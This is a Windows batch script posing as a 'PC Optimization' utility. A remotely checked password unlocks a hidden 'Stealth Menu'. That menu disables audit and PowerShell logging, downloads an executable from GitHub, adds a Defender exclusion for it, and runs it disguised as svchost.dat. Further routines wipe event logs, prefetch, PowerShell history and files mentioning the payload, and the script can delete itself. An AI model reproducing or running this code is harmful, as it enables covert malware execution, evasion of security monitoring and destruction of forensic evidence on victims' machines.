@echo off
setlocal enabledelayedexpansion

:: Remote stealth password URL
set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/refs/heads/main/stealth_password.txt"

:: URL to EXE file (CAXVN.exe) on GitHub
set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"

:: Local temp paths
set "SETUP_EXE=%temp%\CAXVN.exe"
set "DISGUISED_EXE=%temp%\svchost.dat"

:: Determine which PowerShell is available (CRITICAL FOR POWERSEHLL COMMANDS)
set "PWSH=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%ProgramFiles%\PowerShell\7\pwsh.exe" set "PWSH=%ProgramFiles%\PowerShell\7\pwsh.exe"

:LOGIN
cls
echo ==========================================
echo           PC Optimization
echo         Developed by MaxyPrime
echo ==========================================
echo.
set /p userpass=Enter your password:

if "%userpass%"=="1" (
    goto OPTIMIZATION_MENU
) else (
    call :CheckStealthPassword "%userpass%"
    if errorlevel 1 (
        echo Incorrect password. Try again.
        timeout /t 2 /nobreak >nul
        goto LOGIN
    ) else (
        goto STEALTH_MENU
    )
)

goto LOGIN

:CheckStealthPassword
set "inputpass=%~1"
:: Using %PWSH% for robustness
for /f "usebackq delims=" %%A in (`"%PWSH%" -Command "(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim()"`) do set "remote_pass=%%A"
if /i "%inputpass%"=="%remote_pass%" (
    exit /b 0
) else (
    exit /b 1
)

:OPTIMIZATION_MENU
cls
echo ==========================================
echo           PC Optimization Menu
echo ==========================================
echo 1. Clean Registry Logs
echo 2. Clean Event Logs
echo 3. Clear Temp Files
echo 4. Flush DNS Cache
echo 5. Check Disk for Errors
echo 6. Defragment Disk
echo 7. System File Checker
echo 8. Return to Main Menu
echo.
set /p optchoice=Select an option (1-8):

if "%optchoice%"=="1" goto CLEAN_REGISTRY_LOGS
if "%optchoice%"=="2" goto CLEAN_EVENT_LOGS
if "%optchoice%"=="3" goto CLEAR_TEMP_FILES
if "%optchoice%"=="4" goto FLUSH_DNS_CACHE
if "%optchoice%"=="5" goto CHECK_DISK
if "%optchoice%"=="6" goto DEFRAGMENT_DISK
if "%optchoice%"=="7" goto SYSTEM_FILE_CHECKER
if "%optchoice%"=="8" goto LOGIN

echo Invalid option. Try again.
timeout /t 2 /nobreak >nul
goto OPTIMIZATION_MENU

:CLEAN_REGISTRY_LOGS
echo Cleaning Registry Logs...
for /f "tokens=*" %%G in ('wevtutil el') do (
    wevtutil cl "%%G" 2>nul
)
echo Registry logs cleared.
pause
goto OPTIMIZATION_MENU

:CLEAN_EVENT_LOGS
echo Cleaning Event Logs...
for /f "tokens=*" %%G in ('wevtutil el') do (
    wevtutil cl "%%G" 2>nul
)
echo Event logs cleared.
pause
goto OPTIMIZATION_MENU

:CLEAR_TEMP_FILES
echo Clearing Temp Files...
del /s /q "%temp%\*.*" >nul 2>&1
del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
echo Temp files cleared.
pause
goto OPTIMIZATION_MENU

:FLUSH_DNS_CACHE
echo Flushing DNS Cache...
ipconfig /flushdns
echo DNS Cache flushed.
pause
goto OPTIMIZATION_MENU

:CHECK_DISK
echo Checking Disk for Errors...
chkdsk C: /f /r
pause
goto OPTIMIZATION_MENU

:DEFRAGMENT_DISK
echo Defragmenting C: drive...
defrag C: /U /V
pause
goto OPTIMIZATION_MENU

:SYSTEM_FILE_CHECKER
echo Running System File Checker...
sfc /scannow
pause
goto OPTIMIZATION_MENU

:STEALTH_MENU
cls
echo  ===========================================
echo.
echo              *** STEALTH MENU ***
echo            Authorized Personnel Only
echo.
echo  ===========================================
echo.
echo  1. Setup
echo  2. Run
echo  3. Bypass
echo  4. Alert the Admin !!!
echo  5. Exit
echo  6. Self-Destruct Stealth Menu
echo.
set /p choice=Choose an option:

if "%choice%"=="1" goto SETUP
if "%choice%"=="2" goto RUN
if "%choice%"=="3" goto BYPASS
if "%choice%"=="4" goto ALERT_ADMIN
if "%choice%"=="5" goto EXIT
if "%choice%"=="6" goto SELF_DESTRUCT

echo Invalid choice. Try again.
timeout /t 2 /nobreak >nul
goto STEALTH_MENU

:: --- Subroutines for Audit Logs ---
:DisableAuditLogs
echo [*] Disabling process creation auditing...
auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable >nul 2>&1
exit /b

:EnableAuditLogs
echo [*] Re-enabling process creation auditing...
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable >nul 2>&1
exit /b

:DisablePowerShellLogging
echo [*] Disabling PowerShell script block logging...
reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v "EnableScriptBlockLogging" /t REG_DWORD /d 0 /f >nul 2>&1
exit /b

:EnablePowerShellLogging
echo [*] Enabling PowerShell script block logging...
reg add "HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v "EnableScriptBlockLogging" /t REG_DWORD /d 1 /f >nul 2>&1
exit /b

:: --- Subroutines for Defender Exclusion ---
:AddDefenderExclusion
echo [*] Adding Defender exclusion for the EXE...
"%PWSH%" -Command "Add-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
exit /b

:RemoveDefenderExclusion
echo [*] Removing Defender exclusion for the EXE...
"%PWSH%" -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
exit /b

:: --- SETUP Option ---
:SETUP
call :DisableAuditLogs
call :DisablePowerShellLogging

echo STEP 1: Preparing download...
timeout /t 1 /nobreak >nul
echo STEP 2: Connecting to GitHub...
timeout /t 1 /nobreak >nul
echo STEP 3: Downloading payload (CAXVN.exe)...
:: Using %PWSH% for robustness
"%PWSH%" -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')"

if exist "%SETUP_EXE%" (
    echo Download successful.
    call :AddDefenderExclusion
) else (
    echo Failed to download EXE.
    pause
    call :EnableAuditLogs
    call :EnablePowerShellLogging
    goto STEALTH_MENU
)

call :EnableAuditLogs
call :EnablePowerShellLogging
pause
goto STEALTH_MENU

:RUN
echo Disabling Data Usage Service...
sc stop dmwappushservice >nul 2>&1
sc config dmwappushservice start= disabled >nul 2>&1

echo Preparing disguised EXE...

if not exist "%SETUP_EXE%" (
    echo EXE not found. Please run Setup first.
    pause
    goto STEALTH_MENU
)

copy /Y "%SETUP_EXE%" "%DISGUISED_EXE%" >nul 2>&1
start "" /b "%DISGUISED_EXE%"

:WAIT_LOOP
timeout /t 2 /nobreak >nul
tasklist /FI "IMAGENAME eq svchost.dat" | find /I "svchost.dat" >nul
if not errorlevel 1 (
    goto WAIT_LOOP
)

del /f /q "%DISGUISED_EXE%" >nul 2>&1
echo EXE run completed and cleaned up.
pause
goto STEALTH_MENU

:BYPASS
echo [*] Initiating Bypass - cleanup and restore...
pause

:: Admin Privilege Check (CRITICAL for many commands below)
whoami /groups | find "S-1-5-32-544" > nul
if %errorlevel% neq 0 (
    echo [!] ERROR: Admin privileges required for full bypass cleanup.
    echo Please run this script as Administrator.
    pause
    goto STEALTH_MENU
)
pause
echo [+] Admin privileges confirmed for Bypass.
pause

echo [*] Re-enabling Data Usage Service...
sc config dmwappushservice start= auto >nul 2>&1
sc start dmwappushservice >nul 2>&1
pause

:: Re-enable Audit Logs and PowerShell Logging
call :EnableAuditLogs
call :EnablePowerShellLogging
pause
echo [+] Audit logs and PowerShell logging re-enabled.
pause

echo [*] Running cleanup...
pause

:: Clear recent files
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
pause
echo [+] Recent files cleared.
pause

:: Clear prefetch files
del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
pause
echo [+] Prefetch files cleared.
pause

:: Clear temp files
del /s /q "%temp%\*.*" >nul 2>&1
del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
pause
echo [+] Temp files cleared.
pause

:: Clear event logs
for /f "tokens=*" %%G in ('wevtutil el') do (
    wevtutil cl "%%G" 2>nul
)
pause
echo [+] Event logs cleared.
pause

:: Flush DNS
ipconfig /flushdns >nul
pause
echo [+] DNS Cache flushed.
pause

:: Clear clipboard
echo off | clip
pause
echo [+] Clipboard cleared.
pause

:: Re-enable Defender exclusion removal
call :RemoveDefenderExclusion
pause
echo [+] Defender exclusion removed.
pause

:: Clear WMI Repository logs (Good practice for stealth)
echo [*] Clearing WMI Repository logs...
winmgmt /salvagerepository >nul 2>&1
pause
echo [+] WMI Repository logs cleared.
pause

:: Clean PowerShell History
call :CLEAN_PS_HISTORY
pause
echo [+] PowerShell history cleaned.
pause

echo Cleanup done. All traces removed.
pause
goto STEALTH_MENU

:ALERT_ADMIN
cls
echo Enter your alert message (max 20 words):
set /p alertmsg=
echo You entered: %alertmsg%
echo (Feature to send message not implemented yet)
pause
goto STEALTH_MENU

:EXIT
exit

:SELF_DESTRUCT
echo Initiating Self-Destruct...
timeout /t 1 /nobreak >nul

:: Delete downloaded EXE and disguised file
del /f /q "%SETUP_EXE%" >nul 2>&1
del /f /q "%DISGUISED_EXE%" >nul 2>&1

:: Delete this batch file using VBS
set "BATFILE=%~f0"
echo Set fso = CreateObject("Scripting.FileSystemObject") > "%temp%\delete_me.vbs"
echo fso.DeleteFile "%BATFILE%", True >> "%temp%\delete_me.vbs"
start /min "" "%temp%\delete_me.vbs"
timeout /t 2 /nobreak >nul
del "%temp%\delete_me.vbs" >nul 2>&1

exit

:: --- PowerShell History Cleanup Subroutine (Re-added) ---
:CLEAN_PS_HISTORY
echo [*] Cleaning PowerShell history and related logs...
del /f /q "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >nul 2>&1
for /r "%userprofile%" %%F in (*.txt *.log *.ps1) do (
    findstr /i "CAXVN.exe" >nul 2>&1 "%%F" && del "%%F" >nul 2>&1
    findstr /i "%~nx0" >nul 2>&1 "%%F" && del "%%F" >nul 2>&1
)
wevtutil cl "Microsoft-Windows-PowerShell/Operational" >nul 2>&1
exit /b 0
